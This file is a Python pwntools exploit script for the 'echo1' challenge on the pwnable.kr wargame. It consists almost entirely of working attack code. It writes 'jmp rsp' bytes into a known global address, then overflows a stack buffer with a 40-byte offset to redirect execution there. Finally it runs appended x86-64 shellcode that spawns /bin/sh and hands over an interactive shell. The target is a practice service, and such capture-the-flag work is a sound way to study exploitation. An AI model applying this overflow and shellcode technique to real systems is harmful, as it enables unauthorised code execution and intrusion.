import argparse

from pwn import *

TARGET_BINARY = "./echo1"
ID_ADDRESS = 0x6020a0
BOF_OFFSET = 40
JUMP_STACK_SHELLCODE = b"\xFF\xD4"
PAYLOAD = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--debug", type=bool, default=False, required=False)

    args = parser.parse_args()

    if args.debug:
        p = process([TARGET_BINARY])
        gdb.attach(p, gdbscript="""
                    b get_input
                    continue
                        """)
    else:
        p = remote("pwnable.kr", 9010)

    response = p.recvuntil(b"hey, what's your name? :")
    log.info(f"Response: {response}")

    p.sendline(JUMP_STACK_SHELLCODE)

    response = p.recvuntil(b">")
    log.info(f"Response: {response}")

    p.sendline(b"1")

    response = p.recvline()
    log.info(f"Response: {response}")

    log.info(f"Triggering BOF with offset of {BOF_OFFSET}")
    p.sendline(b"A" * BOF_OFFSET + p64(ID_ADDRESS) + PAYLOAD)

    response = p.recvline()
    log.info(f"Response: {response}")

    log.info("Exploit completed, Starting interactive shell")

    p.interactive()


if __name__ == "__main__":
    main()
